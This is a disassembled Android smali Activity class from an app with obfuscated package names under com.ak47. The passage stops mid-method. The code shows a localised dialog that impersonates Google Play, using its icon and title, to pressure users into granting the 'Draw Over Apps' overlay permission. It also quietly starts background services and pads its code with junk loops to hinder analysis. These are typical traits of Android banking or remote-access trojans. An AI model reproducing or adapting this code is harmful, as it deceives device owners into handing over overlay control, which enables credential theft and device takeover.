.class public Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;
.super Landroid/app/Activity;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$g;
    }
.end annotation


# instance fields
.field private a:Landroid/view/View$OnClickListener;

.field private b:Landroid/view/View$OnClickListener;

.field c:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$d;

    invoke-direct {v0, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$d;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;)V

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->a:Landroid/view/View$OnClickListener;

    new-instance v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$e;

    invoke-direct {v0, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$e;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;)V

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->b:Landroid/view/View$OnClickListener;

    return-void
.end method

.method private a()V
    .locals 8

    new-instance v0, Landroid/app/AlertDialog$Builder;

    new-instance v1, Landroid/view/ContextThemeWrapper;

    const/high16 v2, 0x7f0a0000

    invoke-direct {v1, p0, v2}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V

    invoke-direct {v0, v1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/16 v3, 0xc31

    const/4 v4, 0x3

    const/4 v5, 0x2

    const/4 v6, 0x1

    if-eq v2, v3, :cond_3

    const/16 v3, 0xc6b

    if-eq v2, v3, :cond_2

    const/16 v3, 0xca9

    if-eq v2, v3, :cond_1

    const/16 v3, 0xe7e

    if-eq v2, v3, :cond_0

    goto :goto_0

    :cond_0
    const-string v2, "tr"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x3

    goto :goto_1

    :cond_1
    const-string v2, "en"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x0

    goto :goto_1

    :cond_2
    const-string v2, "cn"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x2

    goto :goto_1

    :cond_3
    const-string v2, "ar"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x1

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v1, -0x1

    :goto_1
    const-string v2, "Enable Draw Over Apps For: "

    const-string v3, "Cancel"

    const v7, 0x7f09001c

    if-eqz v1, :cond_8

    if-eq v1, v6, :cond_7

    if-eq v1, v5, :cond_6

    if-eq v1, v4, :cond_5

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v7}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "OK"

    goto :goto_2

    :cond_5
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "di\u011fer uygulamalar \u00fczerinde \u00e7izimi etkinle\u015ftir:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v7}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "Tamam"

    const-string v3, "iptal"

    goto :goto_2

    :cond_6
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u8bf7\u542f\u7528\uff0c\u663e\u793a\u5728\u5e94\u7528\u7a0b\u5e8f:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v7}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u4f7f\u80fd\u591f"

    const-string v3, "\u53d6\u6d88"

    goto :goto_2

    :cond_7
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u062a\u0645\u0643\u064a\u0646 \u060c \u0627\u0644\u0625\u0638\u0647\u0627\u0631 \u0641\u0648\u0642 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a \u0644\u0640: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v7}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u062a\u0641\u0639\u064a\u0644"

    const-string v3, "\u0625\u0644\u063a\u0627\u0621"

    goto :goto_2

    :cond_8
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v7}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "Enable"

    :goto_2
    :try_start_0
    sget-object v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->s:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v4, "com.android.vending"

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const-string v2, "Google Play"

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_7

    :catch_0
    :try_start_1
    sget-object v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->s:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    invoke-virtual {p0, v7}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_7

    :catch_1
    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_3
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_9

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :cond_9
    :goto_4
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_a

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_4

    :cond_a
    :goto_5
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_b

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_5

    :cond_b
    :goto_6
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_c

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_6

    :cond_c
    :goto_7
    new-instance v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$a;

    invoke-direct {v2, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$a;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    new-instance v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$b;

    invoke-direct {v1, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$b;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;)V

    invoke-virtual {v0, v3, v1}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    new-instance v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$c;

    invoke-direct {v1, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$c;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;)V

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setOnCancelListener(Landroid/content/DialogInterface$OnCancelListener;)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void
.end method

.method private b(Landroid/content/Context;)Z
    .locals 1

    const-string v0, "connectivity"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/net/ConnectivityManager;

    invoke-virtual {p1}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object p1

    if-eqz p1, :cond_0

    invoke-virtual {p1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p1, 0x1

    return p1

    :cond_0
    const/4 p1, 0x0

    return p1
.end method


# virtual methods
.method public finish()V
    .locals 2

    sget-boolean v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;->o:Z

    if-eqz v0, :cond_0

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->f:Ljava/lang/String;

    const-string v1, " "

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v0, v1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;->j(Ljava/lang/String;[B)V

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    return-void
.end method

.method public onBackPressed()V
    .locals 1

    :try_start_0
    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V

    goto :goto_0

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 8

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    invoke-virtual {p0, p1}, Landroid/app/Activity;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x400

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setFlags(II)V

    :try_start_0
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v2, 0x7f090315

    invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->c:Ljava/lang/String;

    const-class v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;

    invoke-static {v1, v0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/c;->g(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_0

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    const-class v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;

    invoke-static {v1, v0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/c;->g(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_2

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_1

    invoke-static {}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->f()Z

    move-result v1

    if-eqz v1, :cond_1

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_1
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_2
    :goto_0
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->c:Ljava/lang/String;

    const-string v1, "K"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-virtual {p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->finish()V

    return-void

    :cond_3
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->s:Landroid/content/Context;

    if-nez v0, :cond_4

    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->s:Landroid/content/Context;

    :cond_4
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_8

    invoke-static {}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->a()Z

    move-result v0

    if-eqz v0, :cond_8

    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_8

    invoke-direct {p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->a()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_5

    :catch_0
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_1
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_5

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_5
    :goto_2
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_6

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_6
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_7

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :cond_7
    :goto_4
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_8

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_4

    :cond_8
    :goto_5
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->b(Landroid/content/Context;)Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_12

    const v0, 0x7f070003

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    const v0, 0x7f050022

    invoke-virtual {p0, v0}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v2

    const/4 v3, -0x1

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/16 v5, 0xc31

    const/4 v6, 0x3

    const/4 v7, 0x2

    if-eq v4, v5, :cond_c

    const/16 v5, 0xc6b

    if-eq v4, v5, :cond_b

    const/16 v5, 0xca9

    if-eq v4, v5, :cond_a

    const/16 v1, 0xe7e

    if-eq v4, v1, :cond_9

    goto :goto_6

    :cond_9
    const-string v1, "tr"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_d

    const/4 v1, 0x3

    goto :goto_7

    :cond_a
    const-string v4, "en"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    goto :goto_7

    :cond_b
    const-string v1, "cn"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_d

    const/4 v1, 0x2

    goto :goto_7

    :cond_c
    const-string v1, "ar"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_d

    const/4 v1, 0x1

    goto :goto_7

    :cond_d
    :goto_6
    const/4 v1, -0x1

    :goto_7
    if-eqz v1, :cond_11

    if-eq v1, p1, :cond_10

    if-eq v1, v7, :cond_f

    if-eq v1, v6, :cond_e

    const-string p1, "no internet connection detected.\n\n please connect to internet and try again"

    goto :goto_8

    :cond_e
    const-string p1, "internet ba\u011flant\u0131s\u0131 alg\u0131lanmad\u0131.\n\n l\u00fctfen internete ba\u011flan\u0131n ve tekrar deneyin"

    goto :goto_8

    :cond_f
    const-string p1, "\u672a\u68c0\u6d4b\u5230 Internet \u8fde\u63a5\u3002\n\n \u8bf7\u8fde\u63a5\u5230 Internet \u5e76\u91cd\u8bd5"

    goto :goto_8

    :cond_10
    const-string p1, "\u0644\u0645 \u064a\u062a\u0645 \u0627\u0644\u0643\u0634\u0641 \u0639\u0646 \u0627\u062a\u0635\u0627\u0644 \u0628\u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a .\n\n \u0627\u0644\u0631\u062c\u0627\u0621 \u0627\u0644\u0627\u062a\u0635\u0627\u0644 \u0628\u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a \u0648\u0627\u0644\u0645\u062d\u0627\u0648\u0644\u0629 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649"

    goto :goto_8

    :cond_11
